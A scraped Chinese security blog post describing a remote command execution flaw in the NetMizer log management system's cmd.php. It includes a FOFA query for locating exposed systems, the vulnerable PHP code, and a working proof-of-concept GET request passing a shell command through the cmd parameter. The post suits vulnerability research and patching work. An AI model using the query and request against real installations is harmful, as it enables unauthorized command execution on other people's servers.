@@ -1,0 +1,537 @@
+---
+title: "NetMizer日志管理系统 cmd.php 远程命令执行漏洞"
+source: https://mrxn.net/jswz/data-manage-cmd-rce.html
+asset_dir: assets/netmizer日志管理系统-cmd.php-远程命令执行漏洞
+---
+
+# NetMizer日志管理系统 cmd.php 远程命令执行漏洞
+
+[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/21 18:40
+* 800浏览
+* [0评论](#comment)
+* 11分钟阅读
+
+深入探索
+
+cmd
+
+应用
+
+SQL
+
+
+(adsbygoogle = window.adsbygoogle || []).push({});
+
+---
+
+# 漏洞简介
+
+NetMizer日志管理系统是全球领先的应用交付与安全解决方案提供商，致力于为企业和运营商提供确保关键业务应用高可用性、高性能和安全性的解决方案。在其cmd.php中存在远程命令执行[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，攻击者通过传递 cmd 参数可执行任意命令，从而对系统造成潜在威胁。
+
+编程
+
+# 影响版本
+
+# fofa语法
+
+> title="NetMizer 日志管理系统"
+
+# 漏洞分析
+
+```
+<?php
+        include('../include/JSON.php');
+
+        $ip = $_SERVER["REMOTE_ADDR"];
+        $port = $_SERVER["REMOTE_PORT"];
+
+        echo "sh test.sh $ip $port<br>";
+        ob_flush();
+        flush();
+        exec("sh test.sh $ip $port &> /dev/null &");
+        if($type == 1) $cmd = "ping 8.8.8.8";
+        else if($type == 2) $cmd = "vmstat -w 1";
+        ob_implicit_flush();
+        $fp = popen($cmd, "r");
+        if($fp) {
+                echo "<pre>";
+                ob_flush();
+                flush();
+                while($line=fgets($fp, 2048)) {
+                        echo $line;
+                        ob_flush();
+                        flush();
+
+                }
+                sleep(1);
+                pclose($fp);
+        }
+
+?>
+```
+
+深入探索
+
+软件
+
+计算机安全
+
+应用程序
+
+如果 type 不等于 1 或 2 就直接将 cmd 参数的值传入 popen 函数进行执行并回显命令执行结果，造成[命令执行](https://mrxn.net/tag/rce)漏洞。
+
+# 漏洞复现
+
+```
+GET /data/manage/cmd.php?cmd=id HTTP/1.1
+Host: test.mrxn.net
+```
+
+成功回显id命令执行的结果
+
+漏洞修复方案
+
+[![NetMizer日志管理系统 cmd.php 远程命令执行漏洞](images/img-001-42272b881df5.webp)](https://image.mrxn.net/c4253b5d1f3f4d4c912c9c41ed8c707f.webp)
+
+* 标签：
+* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
+* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
+* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
+* [#rce](https://mrxn.net/tag/rce)
+
+---
+
+
+// 获取当前脚本所在的父容器
+const parentContainer = document.currentScript.parentElement;
+let searchContainer = parentContainer.querySelector('article') || parentContainer;
+if (searchContainer) {
+// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
+let images = [];
+const containers = searchContainer.querySelectorAll('.prose, .markdown');
+containers.forEach(function(container) {
+images = images.concat(Array.from(container.querySelectorAll('img')));
+});
+if (images.length === 0) {
+images = searchContainer.querySelectorAll('img');
+}
+images.forEach(function(img) {
+if (img.getAttribute('data-action') === 'zoom') {
+const parentLink = img.parentNode;
+if (parentLink.tagName === 'A') {
+parentLink.setAttribute('data-fancybox', 'gallery');
+}
+} else {
+const link = document.createElement('a');
+link.setAttribute('data-fancybox', 'gallery');
+link.setAttribute('href', img.getAttribute('src'));
+img.parentNode.insertBefore(link, img);
+link.appendChild(img);
+}
+});
+// 初始化 Fancybox
+Fancybox.bind("[data-fancybox]", {
+// 您的自定义选项
+});
+}
+
+文章目录
+×
+
+* [1.漏洞简介](#toc-1-)
+* [2.影响版本](#toc-2-)
+* [3.fofa语法](#toc-3-)
+* [4.漏洞分析](#toc-4-)
+* [5.漏洞复现](#toc-5-)
+
+
+
+.x\_nav\_toc {
+position: fixed;
+top: 0;
+right: -300px;
+width: 280px;
+height: 100%;
+background-color: white;
+box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
+z-index: 1000;
+transition: right 0.3s ease;
+display: flex;
+flex-direction: column;
+overflow: hidden;
+padding-top: 10px;
+}
+.x\_nav\_toc.active {
+right: 0;
+}
+.x\_toc\_header {
+display: flex;
+justify-content: space-between;
+align-items: center;
+padding: 15px 20px;
+height: 48px;
+border-bottom: 1px solid #eee;
+}
+.x\_toc\_title {
+font-size: 18px;
+font-weight: bold;
+color: #333;
+}
+.x\_toc\_close {
+background: none;
+border: none;
+font-size: 24px;
+cursor: pointer;
+color: #777;
+transition: color 0.2s;
+}
+.x\_toc\_close:hover {
+color: #333;
+}
+.x\_toc\_content {
+flex: 1;
+overflow-y: auto;
+padding: 15px 20px;
+padding-right: 10px;
+}
+.x\_anchor-list {
+list-style-type: none;
+padding: 0;
+margin: 0;
+}
+/\* 减小目录项间距 \*/
+.x\_anchor-list li {
+margin-bottom: 4px; /\* 间距从8px减小到4px \*/
+}
+.x\_anchor-list a {
+text-decoration: none;
+color: #555;
+display: block;
+padding: 6px 10px; /\* 减少内边距 \*/
+transition: all 0.2s;
+font-size: 14px;
+border-radius: 4px;
+line-height: 1.4; /\* 减小行高 \*/
+}
+.x\_anchor-list a:hover,
+.x\_anchor-list a:focus {
+background-color: #f8f9fa;
+color: #0068d6;
+}
+.toc-number {
+font-weight: 600;
+margin-right: 8px;
+color: #495057;
+display: inline-block;
+min-width: 25px;
+}
+/\* 减小各级标题间距 \*/
+.toc-h1 {
+font-weight: 600;
+font-size: 15px;
+margin-top: 10px; /\* 上边距从15px减小到10px \*/
+padding-left: 5px !important;
+}
+.toc-h2 {
+font-size: 14px;
+padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
+}
+.toc-h3 {
+font-size: 13px;
+padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
+}
+.toc-h4 {
+font-size: 12px;
+padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
+}
+/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
+.x\_toc\_toggle {
+position: fixed;
+bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
+border-radius: 50%;
+border: none;
+cursor: pointer;
+box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+z-index: 999;
+transition: all 0.3s ease;
+display: flex;
+align-items: center;
+justify-content: center;
+padding: 0;
+}
+.x\_toc\_toggle svg {
+width:24px;height:24px;stroke:#3d9bff;
+}
+.x\_toc\_toggle:hover {
+#background-color: #0081f8;
+transform: translateY(-3px);
+box-shadow: 0 6px 15px rgba(0,0,0,0.2);
+}
+@media (max-width: 768px) {
+.x\_nav\_toc {
+width: 280px;
+}
+.x\_toc\_toggle {
+bottom: 100px; /\* 手机端也下移位置 \*/
+right: 30px;
+width: 40px;
+height: 40px;
+}
+.x\_toc\_toggle svg {
+width: 20px;
+height: 20px;
+}
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+// 获取所有标题元素
+var className = ".line-numbers";
+var selectors = [];
+for (var i = 1; i <= 6; i++) {
+selectors.push(className + ' h' + i);
+}
+var headings = document.querySelectorAll(selectors.join(', '));
+// 获取DOM元素
+var tocContainer = document.querySelector('.x\_nav\_toc');
+var toggleButton = document.querySelector('.x\_toc\_toggle');
+var tocList = document.querySelector('.x\_anchor-list');
+var closeButton = document.querySelector('.x\_toc\_close');
+var currentHighlight = null;
+// 检测是否为移动设备
+const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+// 如果没有标题，隐藏所有元素
+if (headings.length === 0) {
+tocContainer.style.display = 'none';
+toggleButton.style.display = 'none';
+return;
+}
+// 初始化层级计数器
+var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
+var currentLevel = 0;
+// 生成带数字编号的目录
+headings.forEach(function(heading, index) {
+var level = parseInt(heading.tagName[1]);
+// 更新计数器
+counters[level - 1] += 1; // 增加当前级别计数器
+// 重置更低级计数器
+for (var i = level; i < 6; i++) {
+counters[i] = 0;
+}
+// 生成编号字符串（如"1.2.3"）
+var numberParts = [];
+for (var i = 0; i < level; i++) {
+if (counters[i] > 0) {
+numberParts.push(counters[i]);
+}
+}
+var numberText = numberParts.join('.')+'.';
+// 创建唯一ID
+var id = 'toc-' + numberText.replace(/\./g, '-');
+heading.id = id;
+var listItem = document.createElement('li');
+var anchor = document.createElement('a');
+var numberSpan = document.createElement('span');
+numberSpan.className = 'toc-number';
+numberSpan.textContent = numberText;
+anchor.appendChild(numberSpan);
+anchor.innerHTML += heading.textContent;
+anchor.href = '#' + id;
+anchor.classList.add('toc-h' + level);
+listItem.appendChild(anchor);
+tocList.appendChild(listItem);
+// 添加点击事件（不关闭目录）
+anchor.addEventListener('click', function(e) {
+e.preventDefault();
+// 更新高亮状态
+if (currentHighlight) {
+currentHighlight.classList.remove('active');
+}
+this.classList.add('active');
+currentHighlight = this;
+// 滚动到对应位置
+var targetId = this.getAttribute('href').substring(1);
+var targetElement = document.getElementById(targetId);
+if (targetElement) {
+var header = document.querySelector("header");
+var headerHeight = header ? header.offsetHeight : 0;
+var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
+var offsetPosition = elementPosition - headerHeight - 20;
+window.scrollTo({
+top: offsetPosition,
+behavior: 'smooth'
+});
+// 滚动到目录项的可视区域
+this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
+// 点击事件中
+if (isMobile) {
+closeToc(); // 移动端点击后关闭目录
+}
+}
+});
+});
+// 切换按钮点击事件
+toggleButton.addEventListener('click', function() {
+tocContainer.classList.add('active');
+});
+// 关闭按钮点击事件
+closeButton.addEventListener('click', function(e) {
+e.stopPropagation();
+closeToc();
+});
+// 滚动时更新高亮状态
+window.addEventListener('scroll', function() {
+var fromTop = window.scrollY;
+var header = document.querySelector("header");
+var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
+//console.log(headerHeight);
+// 精准计算标题文档位置
+var activeSection = null;
+headings.forEach(function(heading) {
+var section = document.getElementById(heading.id);
+if (!section) return;
+// 使用getBoundingClientRect获取精确位置
+var rect = section.getBoundingClientRect();
+var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
+var sectionBottom = rect.bottom + fromTop + headerHeight;
+// 增加20px激活区域缓冲
+if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
+activeSection = heading;
+}
+});
+// 更新高亮状态（新增精确边界判断）
+if (activeSection) {
+var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
+if (tocLink && currentHighlight !== tocLink) {
+if (currentHighlight) {
+currentHighlight.blur();
+currentHighlight.classList.remove('active');
+}
+tocLink.classList.add('active');
+tocLink.focus();
+currentHighlight = tocLink;
+// 平滑滚动到可视区域（改进触发条件）
+var tocRect = tocLink.getBoundingClientRect();
+var tocContainerRect = tocContainer.getBoundingClientRect();
+if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
+tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
+}
+}
+}
+});
+// 关闭目录面板
+function closeToc() {
+tocContainer.classList.remove('active');
+}
+});
+
+/\* 超小屏幕隐藏 \*/
+@media (max-width: 768px) {
+#qrcode-right {
+display: none;
+}
+}
+
+版权所有：[Mrxn's Blog](https://mrxn.net/)  
+文章标题：[NetMizer日志管理系统 cmd.php 远程命令执行漏洞](https://mrxn.net/jswz/data-manage-cmd-rce.html)  
+文章链接：<https://mrxn.net/jswz/data-manage-cmd-rce.html>  
+本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。
+
+![](data:image/png;base64,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)
+
+设备上扫码阅读
+
+
+var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
+text: encodeURI("https://mrxn.net/jswz/data-manage-cmd-rce.html"),
+width: 100,
+height: 100,
+colorDark: "#000000",
+colorLight: "#ffffff",
+correctLevel: QRCode.CorrectLevel.H
+});
+
+  
+
+### 📚 推荐阅读
+
+* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
+* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
+* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
+* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
+* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
+* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
+* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
+* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
+* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
+* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
+* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
+* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
+* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
+* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
+* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
+* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
+* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
+* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
+* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
+* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)
+
+  
+
+/\* 底部展示样式 \*/
+.qrcode-bottom-box {
+margin: 40px auto;
+text-align: center;
+}
+.qrcode-title {
+font-size: 16px;
+color: #666;
+margin-bottom: 0px;
+font-weight: bold;
+text-align: center;
+}
+.qrcode-bottom-box img {
+display: inline-block;
+padding: 10px;
+background: #fff;
+border-radius: 8px;
+margin: 10px auto;
+}
+/\* 悬浮展示样式 \*/
+.qrcode-float {
+position: fixed;
+z-index: 9999;
+background: rgba(255,255,255,0.98);
+padding: 20px;
+border-radius: 12px;
+}
+.qrcode-float:hover {
+transform: scale(1.05);
+}
+/\* 移动端适配 \*/
+@media (max-width: 1440px) {
+.qrcode-float {
+right: 2%;
+transform: none;
+}
+}
+/\* 超小屏幕隐藏 \*/
+@media (max-width: 768px) {
+.qrcode-float {
+display: none;
+}
+}
+
+![](data:image/png;base64,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)
+
+手机扫码阅读
+
+
+var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
+text: encodeURI("https://mrxn.net/jswz/data-manage-cmd-rce.html"),
+width: 100,
+height: 100,
+colorDark: "#000000",
+colorLight: "#ffffff",
